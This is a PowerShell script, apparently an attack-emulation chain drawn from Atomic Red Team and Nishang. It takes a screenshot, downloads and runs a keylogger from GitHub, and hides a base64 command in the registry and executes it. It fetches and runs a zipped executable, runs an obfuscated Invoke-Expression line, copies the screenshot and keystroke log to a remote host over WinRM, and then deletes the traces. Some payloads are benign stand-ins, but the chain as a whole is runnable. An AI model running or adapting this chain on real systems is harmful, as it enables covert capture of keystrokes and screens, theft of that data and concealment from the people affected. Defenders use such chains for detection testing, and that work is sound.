[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 

# Windows Screen Capture (CopyFromScreen)
Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save("$env:TEMP\vs.png")

# Utilize PowerShell and external resource to capture keystrokes Payload Provided by PowerSploit
# Upon successful execution, Powershell will execute Get-Keystrokes.ps1 and output to key.log.
Invoke-WebRequest "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Keylogger.ps1" -OutFile "$env:TEMP\Keylogger.ps1"

Set-Location $env:TEMP
.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis

Start-Sleep  -Seconds 2

# Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. 
# Upon successful execution, powershell will execute encoded command and read/write from the registry.
$OriginalCommand = 'Write-Host "Hey, I got you!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))"

Start-Sleep  -Seconds 2

# Mimic execution of compressed executable. When successfully executed, calculator.exe will open.
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip" -OutFile "$env:temp\T1027.zip"
Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
cmd.exe c/ "`"$env:temp\temp_T1027.zip\T1027.exe`""

Start-Sleep  -Seconds 2

# This is an obfuscated PowerShell command which when executed prints "Hello, from PowerShell!". 
# Example is from the 2021 Threat Detection Report by Red Canary.
$cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )

Start-Sleep  -Seconds 2

# Transfer file/s to a remote host thru WinRM Session
$Session = New-PSSession -ComputerName "host-vm" -Credential (Get-Credential)
Copy-Item "$env:TEMP\vs.png" -Destination "C:\Users\secadmin\Downloads" -ToSession $Session
Copy-Item "$env:TEMP\key.log" -Destination "C:\Users\secadmin\Downloads" -ToSession $Session

Start-Sleep  -Seconds 2

# Delete single file/s from the temporary directory using Powershell. 
# Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.
Remove-Item $env:TEMP\vs.png -ErrorAction Ignore
Remove-Item $env:temp\T1027.zip -ErrorAction Ignore

# Recursively delete a folder in the temporary directory using Powershell. 
# Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.
Remove-Item -Path $env:temp\temp_T1027.zip -ErrorAction Ignore